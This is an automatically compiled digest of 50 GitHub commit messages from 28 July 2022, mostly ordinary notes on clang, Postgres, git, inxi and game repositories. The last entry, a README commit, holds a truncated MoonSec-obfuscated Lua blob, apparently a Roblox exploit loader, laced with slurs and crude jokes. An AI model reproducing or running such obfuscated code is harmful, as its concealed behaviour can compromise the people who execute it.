## *good gosh*

It's so many stuff on **github**! Here's one more attempt to *get a grip*. And
an [index](docs/messages.md).

---

# [2022-07-28](docs/good-messages/2022/2022-07-28.md)


1,955,436 events recorded by [gharchive.org](https://www.gharchive.org/) of which 1,955,436 were push events containing 3,003,392 commit messages that amount to 219,982,543 characters filtered with [words.py@e23d022007...](https://github.com/defgsus/good-github/blob/e23d022007992279f9bcb3a9fd40126629d787e2/src/words.py) to these 50 messages:


## [raaiq1/llvm](https://github.com/raaiq1/llvm)@[7c51f02eff...](https://github.com/raaiq1/llvm/commit/7c51f02effdbd0d5e12bfd26f9c3b2ab5687c93f)
#### Thursday 2022-07-28 00:50:43 by Matheus Izvekov

[clang] Implement ElaboratedType sugaring for types written bare

Without this patch, clang will not wrap in an ElaboratedType node types written
without a keyword and nested name qualifier, which goes against the intent that
we should produce an AST which retains enough details to recover how things are
written.

The lack of this sugar is incompatible with the intent of the type printer
default policy, which is to print types as written, but to fall back and print
them fully qualified when they are desugared.

An ElaboratedTypeLoc without keyword / NNS uses no storage by itself, but still
requires pointer alignment due to pre-existing bug in the TypeLoc buffer
handling.

---

Troubleshooting list to deal with any breakage seen with this patch:

1) The most likely effect one would see by this patch is a change in how
   a type is printed. The type printer will, by design and default,
   print types as written. There are customization options there, but
   not that many, and they mainly apply to how to print a type that we
   somehow failed to track how it was written. This patch fixes a
   problem where we failed to distinguish between a type
   that was written without any elaborated-type qualifiers,
   such as a 'struct'/'class' tags and name spacifiers such as 'std::',
   and one that has been stripped of any 'metadata' that identifies such,
   the so called canonical types.
   Example:
   ```
   namespace foo {
     struct A {};
     A a;
   };
   ```
   If one were to print the type of `foo::a`, prior to this patch, this
   would result in `foo::A`. This is how the type printer would have,
   by default, printed the canonical type of A as well.
   As soon as you add any name qualifiers to A, the type printer would
   suddenly start accurately printing the type as written. This patch
   will make it print it accurately even when written without
   qualifiers, so we will just print `A` for the initial example, as
   the user did not really write that `foo::` namespace qualifier.

2) This patch could expose a bug in some AST matcher. Matching types
   is harder to get right when there is sugar involved. For example,
   if you want to match a type against being a pointer to some type A,
   then you have to account for getting a type that is sugar for a
   pointer to A, or being a pointer to sugar to A, or both! Usually
   you would get the second part wrong, and this would work for a
   very simple test where you don't use any name qualifiers, but
   you would discover is broken when you do. The usual fix is to
   either use the matcher which strips sugar, which is annoying
   to use as for example if you match an N level pointer, you have
   to put N+1 such matchers in there, beginning to end and between
   all those levels. But in a lot of cases, if the property you want
   to match is present in the canonical type, it's easier and faster
   to just match on that... This goes with what is said in 1), if
   you want to match against the name of a type, and you want
   the name string to be something stable, perhaps matching on
   the name of the canonical type is the better choice.

3) This patch could exposed a bug in how you get the source range of some
   TypeLoc. For some reason, a lot of code is using getLocalSourceRange(),
   which only looks at the given TypeLoc node. This patch introduces a new,
   and more common TypeLoc node which contains no source locations on itself.
   This is not an inovation here, and some other, more rare TypeLoc nodes could
   also have this property, but if you use getLocalSourceRange on them, it's not
   going to return any valid locations, because it doesn't have any. The right fix
   here is to always use getSourceRange() or getBeginLoc/getEndLoc which will dive
   into the inner TypeLoc to get the source range if it doesn't find it on the
   top level one. You can use getLocalSourceRange if you are really into
   micro-optimizations and you have some outside knowledge that the TypeLocs you are
   dealing with will always include some source location.

4) Exposed a bug somewhere in the use of the normal clang type class API, where you
   have some type, you want to see if that type is some particular kind, you try a
   `dyn_cast` such as `dyn_cast<TypedefType>` and that fails because now you have an
   ElaboratedType which has a TypeDefType inside of it, which is what you wanted to match.
   Again, like 2), this would usually have been tested poorly with some simple tests with
   no qualifications, and would have been broken had there been any other kind of type sugar,
   be it an ElaboratedType or a TemplateSpecializationType or a SubstTemplateParmType.
   The usual fix here is to use `getAs` instead of `dyn_cast`, which will look deeper
   into the type. Or use `getAsAdjusted` when dealing with TypeLocs.
   For some reason the API is inconsistent there and on TypeLocs getAs behaves like a dyn_cast.

5) It could be a bug in this patch perhaps.

Let me know if you need any help!

Signed-off-by: Matheus Izvekov <mizvekov@gmail.com>

Differential Revision: https://reviews.llvm.org/D112374

---
## [hal9000PR/Paradise](https://github.com/hal9000PR/Paradise)@[fd5580307e...](https://github.com/hal9000PR/Paradise/commit/fd5580307e1d3a2821ae8b2f26cb04cdcd139f87)
#### Thursday 2022-07-28 00:56:45 by Contrabang

Adds a blue overlay to scrying orb users. Spirit realm and scrying orb users now have a special description instead of being catatonic (#18366)

* holy shit blue ghosts

* lets fix that

* you cant see it if its not in ya hand

* Their glowing red eyes are glazed over

* farie review

* farie review pt 2

---
## [segurisa/curriculum](https://github.com/segurisa/curriculum)@[79731ab714...](https://github.com/segurisa/curriculum/commit/79731ab714f02a1218fe55986d82129bad65899e)
#### Thursday 2022-07-28 01:03:00 by Isaac Segura

Update installations.md

In the webpage as it is, Step 14 / Line 128 says to paste "sudo ./VBoxLinuxAdditions.run". As it stands the text wraps right after "sudo", making it seem to the student as if the necessary command is "sudo./VBoxLinuxAdditions.run", without the space. I myself believed exactly that and erased the space between "sudo" and ".", which forced me to spend 30 minutes trying to figure out why I kept getting a "No Such File or Directory" error. I propose simply inputting a line break before sudo to have the entire command legible, as well as adding a small tip/hint to NOT delete the space after sudo.

I am so very sorry for making it look as ugly as I did. I am literally proposing these changes right after marking this lesson as complete and my only markdown experience comes from Discord. I hope someone else can format it better with the basic idea I put out there

---
## [Nexix59/unity-oblivion](https://github.com/Nexix59/unity-oblivion)@[dc2f8279d4...](https://github.com/Nexix59/unity-oblivion/commit/dc2f8279d4be56cf9967ff528cc250a526be45d0)
#### Thursday 2022-07-28 01:10:41 by Nexix

did sum stuff lik housie powie. call it a powwow cuz im native. yall aint out now yall fakin. turn the boy over like a religion. or tha minister fiddlin. life lik behavior - nothing to savor, just some more paper to add to my razor.. lemon lime skies like all rise the heavenly night sky is lik no other fudge tha butter too mucker gonna squeeze it out of ya

werfoewjfo34frpohg

---
## [Sea-of-Lost-Souls/Tannhauser-Gate](https://github.com/Sea-of-Lost-Souls/Tannhauser-Gate)@[b15331b4df...](https://github.com/Sea-of-Lost-Souls/Tannhauser-Gate/commit/b15331b4df9bd525ba80b284beb3442f180c01be)
#### Thursday 2022-07-28 01:13:54 by OrionTheFox

[MANUAL MIRROR] The GAGening: Clothesmate edition [MDB IGNORE] (#15100)

* The GAGening: Clothesmate edition

* ThisShouldWork

* hgnbhg

* would probably help to have the right .dmi

* fixed?

* Fuck you

Co-authored-by: Twaticus <46540570+Twaticus@users.noreply.github.com>

---
## [BearerPipelineTest/postgres](https://github.com/BearerPipelineTest/postgres)@[c40ba5f318...](https://github.com/BearerPipelineTest/postgres/commit/c40ba5f318f96a6a5a29729b987ead11c5dc65c1)
#### Thursday 2022-07-28 01:27:53 by Tom Lane

Fix rowcount estimate for SubqueryScan that's under a Gather.

SubqueryScan was always getting labeled with a rowcount estimate
appropriate for non-parallel cases.  However, nodes that are
underneath a Gather should be treated as processing only one
worker's share of the rows, whether the particular node is explicitly
parallel-aware or not.  Most non-scan-level node types get this
right automatically because they base their rowcount estimate on
that of their input sub-Path(s).  But SubqueryScan didn't do that,
instead using the whole-relation rowcount estimate as if it were
a non-parallel-aware scan node.  If there is a parallel-aware node
below the SubqueryScan, this is wrong, and it results in inflating
the cost estimates for nodes above the SubqueryScan, which can cause
us to not choose a parallel plan, or choose a silly one --- as indeed
is visible in the one regression test whose results change with this
patch.  (Although that plan tree appears to contain no SubqueryScans,
there were some in it before setrefs.c deleted them.)

To fix, use path->subpath->rows not baserel->tuples as the number
of input tuples we'll process.  This requires estimating the quals'
selectivity afresh, which is slightly annoying; but it shouldn't
really add much cost thanks to the caching done in RestrictInfo.

This is pretty clearly a bug fix, but I'll refrain from back-patching
as people might not appreciate plan choices changing in stable branches.
The fact that it took us this long to identify the bug suggests that
it's not a major problem.

Per report from bucoo, though this is not his proposed patch.

Discussion: https://postgr.es/m/202204121457159307248@sohu.com

---
## [IndieanaJones/tgstation](https://github.com/IndieanaJones/tgstation)@[707fbfac7e...](https://github.com/IndieanaJones/tgstation/commit/707fbfac7e11837865d70587011aa8197b1d0c35)
#### Thursday 2022-07-28 01:42:48 by san7890

[MDB Ignore] Shifts all (sane) varedited signs to directionals  (#68004)

* [MDB Ignore] Shifts all (sane) varedited signs to directionals

Hey there,

So we have these cool new sign directionals now, but we still have all of the old pixel-shifted pre-fabrications lying around. So, I added an UpdatePaths (as well as Updated the Paths) to be a bit better at using directionals, because directionals are pretty neato.

This should update every single var_edit that used the proper 32 pixelshift (some of them used 28, and I'm unable to account for that automatically with current tooling) into a proper subtype. Mappers tend to learn by looking at well established maps, so it's always important to ensure that the well-established maps use the most recent tooling (i.e.: bring them up to the surface) and avoid needless excess lines in maps.

* The Commit With All The Maps

OH GOD OH FUCK

* Renames the UpdatePaths

---
## [newstools/2022-information-nigeria](https://github.com/newstools/2022-information-nigeria)@[1af9601c7b...](https://github.com/newstools/2022-information-nigeria/commit/1af9601c7bc621fae9eb6779a56d61edbd8ef324)
#### Thursday 2022-07-28 02:00:34 by Billy Einkamerer

Created Text For URL [www.informationng.com/2022/07/lady-celebrates-boyfriend-who-caught-her-cheating-three-times-but-still-stood-by-her-video.html]

---
## [fwahyudianto6/git](https://github.com/fwahyudianto6/git)@[5cb28270a1...](https://github.com/fwahyudianto6/git/commit/5cb28270a1ff94a0a23e67b479bbbec3bc993518)
#### Thursday 2022-07-28 02:06:11 by Ævar Arnfjörð Bjarmason

pack-objects: lazily set up "struct rev_info", don't leak

In the preceding [1] (pack-objects: move revs out of
get_object_list(), 2022-03-22) the "repo_init_revisions()" was moved
to cmd_pack_objects() so that it unconditionally took place for all
invocations of "git pack-objects".

We'd thus start leaking memory, which is easily reproduced in
e.g. git.git by feeding e83c5163316 (Initial revision of "git", the
information manager from hell, 2005-04-07) to "git pack-objects";

    $ echo e83c5163316f89bfbde7d9ab23ca2e25604af290 | ./git pack-objects initial
    [...]
	==19130==ERROR: LeakSanitizer: detected memory leaks

	Direct leak of 7120 byte(s) in 1 object(s) allocated from:
	    #0 0x455308 in __interceptor_malloc (/home/avar/g/git/git+0x455308)
	    #1 0x75b399 in do_xmalloc /home/avar/g/git/wrapper.c:41:8
	    #2 0x75b356 in xmalloc /home/avar/g/git/wrapper.c:62:9
	    #3 0x5d7609 in prep_parse_options /home/avar/g/git/diff.c:5647:2
	    #4 0x5d415a in repo_diff_setup /home/avar/g/git/diff.c:4621:2
	    #5 0x6dffbb in repo_init_revisions /home/avar/g/git/revision.c:1853:2
	    #6 0x4f599d in cmd_pack_objects /home/avar/g/git/builtin/pack-objects.c:3980:2
	    #7 0x4592ca in run_builtin /home/avar/g/git/git.c:465:11
	    #8 0x457d81 in handle_builtin /home/avar/g/git/git.c:718:3
	    #9 0x458ca5 in run_argv /home/avar/g/git/git.c:785:4
	    #10 0x457b40 in cmd_main /home/avar/g/git/git.c:916:19
	    #11 0x562259 in main /home/avar/g/git/common-main.c:56:11
	    #12 0x7fce792ac7ec in __libc_start_main csu/../csu/libc-start.c:332:16
	    #13 0x4300f9 in _start (/home/avar/g/git/git+0x4300f9)

	SUMMARY: LeakSanitizer: 7120 byte(s) leaked in 1 allocation(s).
	Aborted

Narrowly fixing that commit would have been easy, just add call
repo_init_revisions() right before get_object_list(), which is
effectively what was done before that commit.

But an unstated constraint when setting it up early is that it was
needed for the subsequent [2] (pack-objects: parse --filter directly
into revs.filter, 2022-03-22), i.e. we might have a --filter
command-line option, and need to either have the "struct rev_info"
setup when we encounter that option, or later.

Let's just change the control flow so that we'll instead set up the
"struct rev_info" only when we need it. Doing so leads to a bit more
verbosity, but it's a lot clearer what we're doing and why.

An earlier version of this commit[3] went behind
opt_parse_list_objects_filter()'s back by faking up a "struct option"
before calling it. Let's avoid that and instead create a blessed API
for this pattern.

We could furthermore combine the two get_object_list() invocations
here by having repo_init_revisions() invoked on &pfd.revs, but I think
clearly separating the two makes the flow clearer. Likewise
redundantly but explicitly (i.e. redundant v.s. a "{ 0 }") "0" to
"have_revs" early in cmd_pack_objects().

While we're at it add parentheses around the arguments to the OPT_*
macros in in list-objects-filter-options.h, as we need to change those
lines anyway. It doesn't matter in this case, but is good general
practice.

1. https://lore.kernel.org/git/619b757d98465dbc4995bdc11a5282fbfcbd3daa.1647970119.git.gitgitgadget@gmail.com
2. https://lore.kernel.org/git/97de926904988b89b5663bd4c59c011a1723a8f5.1647970119.git.gitgitgadget@gmail.com
3. https://lore.kernel.org/git/patch-1.1-193534b0f07-20220325T121715Z-avarab@gmail.com/

Signed-off-by: Ævar Arnfjörð Bjarmason <avarab@gmail.com>
Signed-off-by: Junio C Hamano <gitster@pobox.com>

---
## [yikf/spark](https://github.com/yikf/spark)@[c4c623a3a8...](https://github.com/yikf/spark/commit/c4c623a3a890267b2f9f8d472c8be30fc5db53e1)
#### Thursday 2022-07-28 02:28:08 by Hyukjin Kwon

[SPARK-39869][SQL][TESTS] Fix flaky hive - slow tests because of out-of-memory

### What changes were proposed in this pull request?

This PR adds some manual `System.gc`. I know enough that this doesn't guarantee the garbage collection and sounds somewhat funny but it works in my experience so far, and I did such hack in some places before.

### Why are the changes needed?

To deflake the tests.

### Does this PR introduce _any_ user-facing change?

No, dev and test-only.

### How was this patch tested?

CI in this PR should test it out.

Closes #37291 from HyukjinKwon/SPARK-39869.

Authored-by: Hyukjin Kwon <gurwls223@apache.org>
Signed-off-by: Hyukjin Kwon <gurwls223@apache.org>

---
## [plinkiac/Best-of-the-Worst](https://github.com/plinkiac/Best-of-the-Worst)@[8b4d1e9d4d...](https://github.com/plinkiac/Best-of-the-Worst/commit/8b4d1e9d4dba5aadda7d18d9d29bc4fa7e8e5653)
#### Thursday 2022-07-28 02:31:10 by Harry S. Plinkett

Create 2022-07-27 - Mouth in Motion, Info-Select, [BLANK], Power Pack - Take a Stand, The Magic of Scarf Tying, Target Panic - It's Causes and Cures, Fundamentals of Rowing, Street Smarts, The Brothers - Fact and Reality, Oh You Beautiful Doll - Doll Collecting for Fun & Profit, Body for Life, It's a Steal, Lights Camera Bubbles, Power Aging, Word Perfect 5.0.txt

---
## [ElementsProject/lightning](https://github.com/ElementsProject/lightning)@[29c6884468...](https://github.com/ElementsProject/lightning/commit/29c6884468face50146b6f9a6c215d52c729f25d)
#### Thursday 2022-07-28 02:38:27 by niftynei

bkpr: add journal entry for offset account balances; report listbalances

When the node starts up, it records missing/updated account balances
to the 'channel' events... which is kinda fucked for wallet + external
events now that i think about it but these are all treated the same
anyway so it's fine.

This is the magic piece that lets your bookkeeping data startup ok on an
already running/established node.

---
## [gutbuster12/bobgluttonstation](https://github.com/gutbuster12/bobgluttonstation)@[9ac403a5a3...](https://github.com/gutbuster12/bobgluttonstation/commit/9ac403a5a36a929d38f56035057754b31d91a26b)
#### Thursday 2022-07-28 05:17:21 by Bob

bobmed 8 part 1.5 whats wrong with my brain holy fuck (!)

---
## [tabulon-ext/inxi](https://github.com/tabulon-ext/inxi)@[ff81310652...](https://github.com/tabulon-ext/inxi/commit/ff81310652eef4cc3cb6d3dce300aa6f21da9ead)
#### Thursday 2022-07-28 05:24:37 by Harald Hope

A good bug fix, and several very good indentation fixes that had always been
around, and some of them known. More fine tuning of CPU process/built data. Bit
by bit it's getting filled out.

Thanks again mrmazda for all the suggestions and watchful eyes.

--------------------------------------------------------------------------------
KNOWN ISSUES:

1. CPU built, process are not perfect and complete and always right. Like life,
it's not perfect, but it is ok. Help complete the feature if it bothers you.

2. Intel Raptor Lake and related APUs are trickling out, but I have not found
cpuid data for the cpu, or generation data for the apu. Was hoping to squeeze
that into 3.3.20, but looks like it will have to go into 3.3.21 or later.

--------------------------------------------------------------------------------
BUGS:

1. MrMazda pointed this out, the printer was not correctly indenting long values
in specific cases, not adding indentation level 1 when the key: value pair was
not the last item on the logical line. Subtle, but could hit Device, OpenGL, and
a few other cases.

2. When SMT is disabled, cpu speed from /sys can return <unknown>, which is a
string, not the numeric value inxi expected. This trips multipe errors when
speed cleaner is used. Thanks issue #273 reporter iamc for this one. My guess is
all during all cpu testing, none of us thought to disable smt to see what would
happen.

--------------------------------------------------------------------------------
FIXES:

1. On disk vendors, Initio isn't a vendor, it's either a misconfigured ide hdd,
slave/master wrong, or bad usb controller. Initio is a default controller, not a
vendor. Added pre-filter in disk_vendor() to remove that string if it appears.

2. Going along with bug 1, finally fixed long standing weakness with long value
wrapping, now continues to build line until it's done, and does not force a new
line after the last long value item.

3. Another glitch where last key: value pair was less than working width, but
total width was greater, was not wrapping correctly.

4. Saw a corner case Intel Core name: Core i7-1165G7 which did not use the
expected intel (core number)(3 digits), modified to look for 3 digits after core
numer OR 2 digits + letter + digit.

5. Added 'tar' installed test for debugger, found cases in actual distros that
shipped without it in their minimal installs. Times sure have changed!

6. Another Centos type change, amazingly, this was shipped without lspci as
well! No idea what went into the install ISO if this stuff didn't include the
most elementary Linux tools. Added lspci missing error if linux and not risc and
no pci_tool detected. I have to admit this is really surprising to me, I mean, I
thought the entire purpose of the rhel family was to provide enterprise
solutions, but to leave out such elementary tools required by every sys admin is
very difficult to understand. This was centos 7.5. I believe Alma and Rocky 9
minimal have those basic tools, so that's an improvement, though they didn't
have tar.

7. Added a '-' between gen and gen number for Intel GPU generation output. Even
though it's documented as for example gen9.5, it looks odd to see it that way,
it's easier to read it as gen-9.5 I think.

8. Did same for AMD arch/codes, for numbered arch/codes like Rage 9, easier to
read as Rage-9.

9. Extreme corner case spotted by mrmazda, if KDE is started by TDE, inxi showed
Trinity, not KDE-Plasma as the desktop. Further, it failed to show Trinity
version, maybe because Trinity was not installed?

--------------------------------------------------------------------------------
ENHANCEMENTS:

1a. More or less completed verification of AMD cpu microarch/built/process, and
added more accurate fallback cases for stray model IDs.
* family 5h: K5, K6
* family 6h: K7
* family 7h: K8 - mostly done, needs some checks.
* family 10h: K10
* family 11h: K11 Turion X2. Note there is some uncertainy about this family
name. Built years n/a yet. Mix of K8/K10
* family 12h: K12 Fusion, K10 based, first APU type?

1b. Extended Intel cpu data a bit more as well. Thanks linuxdaddy from slackware
for the research help there.
* family 4: mostly new, fine tuned, granular
* family 5: more granular, better date/process info.
* family 6: built dates added
* family F: corrected some overly specific stuff

2. Tentative support for finit init system (fast init). Runs in /proc/1/comm,
uses initctl, which may have been revived from its upstart days, not sure. Added
potential support for nosh, linux only, don't know how to detect other bsd init
system.

3. Added amd/intel gpu product IDs.

4. Added shortcut --filter-all/--za, activates all filters: -z, --zl, --zu,
--zv. Why not?

5. Added support for dm types kdmctl and xdmctl, opensuse and maybe redhat use
the latter to start the actual dm running the desktop/wm. You want to see that
because you need to do systemctl restart xdm to restart the actual dm. Thanks
mrmazda for pointing out this one.

6. Added AlmaLinux, RockyLinux, CentosStream to system base (RHEL derived).

7. Basic Raptor Lake gpu/apu support added, with patterns to detect since few
product ids yet. Same applies to Arctic and Alchemist, which still have no
product IDs.

8. More disk vendors and disk vendor ids, never stops - the waters flow on, the
rain falls, then the sun comes out. Until one day it doesn't.

--------------------------------------------------------------------------------
CHANGES:

1. Deprecated --gpu, now it works the same as -Ga, that was too granular and
nobody would use it I think. Now that the new gpu features are solid, no need
for this special feature.

--------------------------------------------------------------------------------
DOCUMENTATION:

1. Updated docs/inxi-values.txt, it didn't have all the --debug-xxx options
listed.

2. Split out some BSD data into docs/inxi-bsd.txt.

3. Big update on docs/inxi-init.txt, moved data to it from other files, updated
the init/service tool data.

4. Renamed init-data.txt to inxi-init.txt, renamed cpu-flags to
inxi-cpu-flags.txt to be more consistent.

5. Updated help, man for new --filter-all option.

6. Updated help and man for --gpu deprecation.

--------------------------------------------------------------------------------
CODE:

1. Moved required perl modules and system programs checks to
check_required_items() in debugger, why not? Also added an error handler for
missing required programs, this is really the only one, and only for
--debug >= 20
This is the only required program test inxi has in it I believe, really amazing
that such a core tool would be left out of an OS today.

2. Removed this redundant block of code from Network device_output() end
section, that repeated in the main get() so didn't seem to serve any purpose.
The test in get() is if n!@rows and if !%risc, same as here, so can't see any
use for it. I'm leaving this here in case that did have some use, but I don't
see it.

if (!@$rows && !%risc){
	my $key = 'Message';
	my $type = 'pci-card-data';
	if ($pci_tool && $alerts{$pci_tool}->{'action'} eq 'permissions'){
		$type = 'pci-card-data-root';
	}
	@$rows = ({
	main::key($num++,0,1,$key) => main::message($type,'')
	});
}

---
## [TirSANX/Hero-s-World](https://github.com/TirSANX/Hero-s-World)@[612771b977...](https://github.com/TirSANX/Hero-s-World/commit/612771b977387c75adc1ce4ac299b9a148a2eeb8)
#### Thursday 2022-07-28 05:47:17 by TirSANX

README.md

,nil,nil;(function() _msec=(function(e,o,_)local K=o[(160-0x78)];local W=_[e[(-0x4a+727)]][e[(99328/0x80)]];local m=(57+-0x35)/(-#[[anime is for fags]]+((8988-(113550/0x19))/234))local O=((0xa4-((0x2cf-373)-211))+-#'you get no absolute bitches')-(-78+0x4f)local z=_[e[(-0x7c+256)]][e[(-#{'nil',53;{},{};93}+288)]];local S=(-#[[holy shit]]+((((39+-0x4d)+-#'so much white liquid daddy')+874)/0x51))+(-#'0nly 1337 smashed ur wap'+(0x3b+-33))local c=_[e[(-#{(function()return{','}end)();'nil',149,26,1;(function()return{','}end)()}+586)]][e[(-#{'}',1,(function()return#{('FHfMoF'):find("\102")}>0 and 1 or 0 end);82,","}+860)]]local l=(0x65-99)-(-#[[sussy]]+(0x5ac/(-#[[loading trojan horse]]+(0x77be/(-0x5d+(0x221-335))))))local s=(-0x61+(0x56a/((6656/((0x2e8-394)-222))+-#[[pls free synapse x i am gamer girl uwu]])))local U=(-0x34+(-0x14+(-0x75+(198+-#{8,(function()return{','}end)(),'nil',8;1,'nil';(function()return#{('OBbKkk'):find("\98")}>0 and 1 or 0 end)}))))local r=(0x5a+((((2349/0x57)+-#[[cilerteddoesntlikeburgers]])+-87)+-0x3))local k=(-#'If not skid then return hasbitches end'+(((((-#{(function()return{','}end)();{},37,(function()return#{('HlMBfk'):find("\77")}>0 and 1 or 0 end),'}';'}','}'}+776)-0x1b4)+-#[[I have stolen your father figure and all your milk muahahahahahaha]])+-0x65)-126))local i=(-113+(-#[[I watch gay furry porn]]+(383-(32472/(298-0xa6)))))local a=(-#{(function()return#{('BklOlL'):find("\108")}>0 and 1 or 0 end),(function()return#{('BklOlL'):find("\108")}>0 and 1 or 0 end),1}+5)local N=((0x50bb/((0x199+-97)+-63))-79)local g=(0x3f8/((-#[[how to find my dad at the dollar store getting milk]]+(-0x4c-(112-0x74)))+0x179))local P=(9+-#{1;1,(function()return#{('bFPMHP'):find("\80")}>0 and 1 or 0 end);1,22})local C=(-#"balls"+((-#"windows xp startup sfx"+((-0x81-(-55+0x8))+6))+107))local D=(0x74-(118+-#{(function()return#{('bFFhHp'):find("\70")}>0 and 1 or 0 end),",",{};'}',(function()return{','}end)();{}}))local B=(10+-#{'}';{};48,",",",",(function()return#{('MBhPfP'):find("\104")}>0 and 1 or 0 end)})local h=(-#{'nil';'}','}','nil',(function()return{','}end)();27,'nil'}+10)local f=((-0x5c2/(72+-#{1,{},'}',{};{}}))+0x19)local w=(-#{196;(function()return#{('Oohpmp'):find("\104")}>0 and 1 or 0 end);{}}+6)local t=(((-28450-((-28146+0x36c2)+-#"real roblox omg builderman caught playing real"))/0xac)+86)local b=(6+-#{{};(function()return#{('KklkfM'):find("\108")}>0 and 1 or 0 end),'nil'})local u=(8+-#{1;1,{},(function()return{','}end)(),'}'})local q=e[(0xb0c6/34)];local L=_[e[(14916/0x71)]][e[(-26+0x1df)]];local H=_[(function(e)return type(e):sub(1,1)..'\101\116'end)(';/^,&,##')..'\109\101'..('\116\97'or'/:!:,.}%')..e[((0x20f62/230)+-#"mama mo")]];local A=_[e[(0x31d8/22)]][e[((0xf18-1993)-0x3c0)]];local v=(102+-0x64)-(81-(((548-0x14d)+-#'ÑÑÑÑÑÑÑ')-0x81))local p=(((0xe460/63)-518)/205)-(96+-0x5e)local F=_[e[((0x150-(271+-0x57))+-#[[Cock and ball tortue]])]][e[(-#{(function()return{','}end)();(function()return#{('hHkbLb'):find("\107")}>0 and 1 or 0 end),'}';{};(function()return{','}end)();24}+360)]];local d=function(e,_)return e.._ end local I=(0x3c4/241)*((((3876/0x33)+-112)+-#[[Ur mom]])+46)local Y=_[e[(0x9b4-1303)]];local x=(84-0x52)*((14+(-127-(27-0x33)))+217)local j=(0x823-1059)*(-#'sussy chat sussy sussy'+(((89+-0x67)-55)+93))local T=((-0x763/(-#"windows xp startup sfx"+(182-0x63)))+83)local y=(-#"hamburger"+((-0x95-(-51-0xa))+0x63))*(-#[[Tomathoust6969 was here]]+(0x71-88))local M=_[e[(0x1aa7d/101)]]or _[e[(0x4e6-674)]][e[(0x1aa7d/101)]];local n=((0x266-(((4-0x15)+372)+-#"get good use moonsec"))+-#[[Tomathoust6969 was here]])local e=_[e[(((93299+-#{1;'}';176,'nil';176})/0x49)+-#"how to find my dad at the dollar store getting milk")]];local A=(function(d)local a,o=1,0x10 local _={j={},v={}}local n=-l local e=o+O while true do _[d:sub(e,(function()e=a+e return e-O end)())]=(function()n=n+l return n end)()if n==(I-l)then n=""o=v break end end local n=#d while e<n+O do _.v[o]=d:sub(e,(function()e=a+e return e-O end)())o=o+l if o%m==v then o=p A(_.j,(F((_[_.v[p]]*I)+_[_.v[l]])))end end return c(_.j)end)("..:::MoonSec::..!*%&/+^,;.:_#$}=.*$;#$#%//_+:*.^;_$,$^$^#:#,_.:&.;;#,==/!$,;^=_}$^+=;+*$_,:/..;}#+},$*$_.}#+_&:+;}%,*+!:==+;+%+*&^&,%=*^!=.#.*;^,_,!^++:/=*=&=%}%&*;/=,/^!+*/,!#_}#;_+::.=$$=,=*},#.#__+:#;$&,%^*_*!/,^#+;/.&=!*&%#/:$:%.,$=$:$$#}$..$;_:_.,;:,%;^,*!&=%},$#*%&&%:%+*&!}}#;.,.^}^&#__$:&:}.:$%*:!_!!=+%$/!/,&*}__#:;.$.%=}}_}&$*#}#!:^.$./.}*_*:#}.,$#*,/_;#.__^:_+!/$$#%:^#::*:!_/=+}+%}^}!.=/^}%=/}+$:#=&^*:*,!,!^#%==}$%#+^%^:_!!}#%}*=*/!.^++/++/%_.##_#_*:^}&===&$=};$.^%/}/&&;^=.*,_;+/,^++$/&&:,/}/_._=+}!,^/!;&%!#^/+*/^&_,&;^;^,_^^+:+*/},$$,#%_,:#!!=+=}}+$;$=$*_.:}:=}=}=/$./%;!%,%!_._.&#}_::=:/$#=^}/}:#}#+#__*_&.;;_=+%/::./_}&!.},*_&*/}##^&:**=%__&&^_+:/=//,_:!;#,$,&&:_/=%}*$^#_!%%,*&!/=:__=&,^^;+$+%_+:*:;%=%+*!!+=:&^/./$%*%;%:%&!_=:=*$%;%^_^!++;_:&.;^}.^;,,:+}&+/;/=&.%}/=#/=$.:^%^$$}%},%+./$/%&,;_:}*#!_!!=+%#+*&$%}%/},},:/.%;,,#_&$;#/_+:_^_^%==*=!}!&=;%=+//!&*%,}$&;:^.+;:,=},$*_=_,_,_/!!/!}%}}%^++%#/!*:%^#}_.:}:&!/=#}&$_$=$+#;_/:}.#**%/*/!.=}/++*//&:&_;+_.:^._.!$;$$}*#.#,.+_;:*;:%.*,!#!*&;+$/.&:&!=!}._}:;.&;;,$_$$!_=_#.^:,.*.},=;*.,!%}}}&$;*$%}*;%+!^!;$%=+$}%$^;+//.&},+.,;*;_/$^_^&/./!&}__^},%!&;#/,*;&;#:;%+,/#/*,..,;.,;,+*=+#/}+!&;};&*%*#,===.},}.$,#:,:#&:#.}/}.^,$,=,;+#+}!=*:;&#,$^#:+}*;!=_}*;,.+$+%/,;}.^.^;,,.^;+_^&/.&$%*&,%,*=!&=}=*#^,:^_^!++.%:/.+;$/+%;!;=$=%/_/+//%.%:%%!.#;=^}_:;$+_/.$.+,/:#;^..^_,^!;/=^.%:$/#,+:%/^;&!._;,,#,*_/#!#,;,:=:&.;;;,#}/!/}$}%$,%!&&*=*%!,=:=##/}:#}###,=}+#=^%=$#$/.&},%=:*#;_/:,&;/+_*$+/$%,;+^#^*+^..:+:#.};};%,#^$+.+#%,%+*^!:+^_^._.!;+#%}/$*_:_#_%:*.*,/;^,_,+/^/#+%/.&=$%_/:..}$_=,}$.%$_#_,*_+:=.;;:;#%=,,+}^!+.&$&=*;%^__}&$^!._*}:::}#+#/.&}&&^:;#,^;!/&^:+;/:;!^=+;,_}&&&=:*!_;+=+#%#^;^*!}*!_%$++_!:=/}.$}*^&*&**_%*!*===.}&$.$+_,+%//&.%}^;^_+$_}$/=%.^_+:+^%!%}:!}.=;.,},&_/#%_&:_:*:&;;;:,*,,+}/!!+$.#}#&*#*#*!!_:#=/$}##$%_:^:_%.,._;,;&,#*$^^+^=#/!&:%&*+*,_:==}.};$}#=_$#;/,&,%#%*^_/=^.^%*#}$,^#+&!+&!}}..&#,+$,:^^+_+!:;:%.!.^,:,*,,+$+=#.$$###*_^=;!=!&=+}/}$=#^/+&/;&$;/;#;.;!,:^!,^+*#+,^#&}+%#!&$;^;;.,,^#^*:#_!:&:....*/,/$%%}!%}=#/+;!%%=*&&:*.!;+,:_*$^#%_&:.,*+&:=%:%*^*!/,=%_.+#&#;_/:..}$^=:}%$&$_#*.$:=.$*$%.*:!=!/^!/=+!&$!#$!_,:#:*=$}#}$$:$$#/#%_#:&^%.!.*;^,,,$=+}^$_$!&.%&*#!.:}.^;&,;^$_+_##!./...:.%,:&^!^&^._+}&#:#/$,%;%:!.*;^,__##:#!#&;./*%}%&*;^!^,^+^!/://&!%#;.=/:.#!!.^,&_$=*$,=/_&#&*%^^&,+^^+}_}}$$.#}#&!+!}!.!+=+=+}_#=#+$!/}&=&/%.^_,/,*^_%+}$$#$*#^=$%%!}===+_.+:;^^&+;/$_%.;.=.+,_^$^.^&*;/%/&&^}$%+!.*/#*=##,:/.$:*_:;: